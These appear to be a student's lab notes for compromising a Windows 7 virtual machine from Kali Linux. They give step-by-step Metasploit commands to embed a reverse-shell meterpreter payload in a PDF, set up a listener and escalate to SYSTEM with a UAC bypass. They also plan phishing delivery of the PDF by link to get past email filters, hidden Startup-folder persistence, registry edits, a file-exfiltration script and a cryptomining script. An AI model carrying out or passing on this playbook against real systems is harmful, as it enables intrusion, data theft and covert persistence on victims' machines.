Have 2 virtual boxes, 1 is Kali Linux (Attacker), and one is Windows 7 (Victim)
For both, go to settings>network and set "Attached to:" to the bridged adapter setting. This allows a network connection between the two boxes.
Start both virtual boxes.



To ensure they have a connection to each other get their IP's:
Kali: 		ip a
Windows: 	ipconfig

Then ping each other on their respective ips, with:
ping IPADDRESS



To create the pdf payload, make sure you have an input PDF, which the payload will be put into, and the ip address of the Kali machine.
Go to the Kali machine, and run the commands:
	msfconsole
	use exploit/windows/fileformat/adobe_pdf_embedded_exe
	set payload windows/meterpreter/reverse_tcp
	set INFILENAME [File path to the input pdf]
	set FILENAME [name for the output pdf, with .pdf extension]
	set LHOST [Kali machine's IP address]
	exploit

This will create a pdf at the location '/home/kali/.msf4/local/embeddedpdf.pdf'.  You will need to enable hidden files to see the .msf4 directory.  We need the windows user to download this file.  It will be flagged as maliscous by email but we can host it somewhere and invite users to click a link to download it.  I have uploaded a file at http://s000.tinyupload.com/index.php?file_id=00151868937440090876.  This is the direct link to the download.  It can be included in an email to users that will geneate a download box without redirecting to the hosting site.  THIS ISN"T WORKING RIGHT NOW AND I AM WASTING TIME ON IT.



Next, to create a listener for this pdf, open a new command prompt and run the following commands:
	msfconsole
	use exploit/multi/handler
	set PAYLOAD windows/meterpreter/reverse_tcp
	set LHOST [Kali machine's IP address]
	exploit
	
This will run a listener, and will provide shell access to the victim's computer when they open the infected pdf.



Note: When the pdf is opened, the user will be prompted to save a PDF with the original pdf's name. For this reason, the input and output pdfs should have the same name. 

Admin Privalage Escalation:
to test if you are an admin, run:
	getuid
if NT AUTHORITY\SYSTEM is returned, you are an admin. To gain admin privalage, run the following while starting inside the reverse shell
	background
	use exploit/windows/local/bypassuac
	set target 1
	set session 1
	set payload windows/x64/meterpreter/reverse_tcp
	set LHOST [Kali machine's IP address]
	run
This should put you back into reverse shell, next, run:
	getsystem
Then test with :
	getuid

We now have admin privildges!  We have 3 tasks to execute, looking around for what we want to exfil, loading out persistance scripts, and modifying the registry to allow for that.

We can navigate to the C:\Users\"REPLACE WITH USER OF INTERST"\AppData\roaming\Microsoft\Windows\Start Menu\Programs\Startup.  Files in this directory will be executed when the user logs into the machine.  We should look around the system and find a folder that seems to be where they keep their important documents and put that into our sender.py script, along with the IP we will be exfiling to.

We can add sender.py, BENDER'S MINING SCRIPT, and registry_edit.py to this folder with the upload command.  sender.py requires dependancies so we will need to drop to the command line with: execute -f cmd.exe -i.  We know have a Command line for the victim machine, which means we can use pip and python.  First we need to run pip install cryptography for the encryption package we will use during exfil.  We then need to run the registry_edit.py script with: python registry_edit.py.  We should have edited this file to reflect the path to the startup directory and the names of the 2 files we want to run on startup.  Before we exit the command prompt we can hide the two files we uploaded with: attrib +h FILENAME.


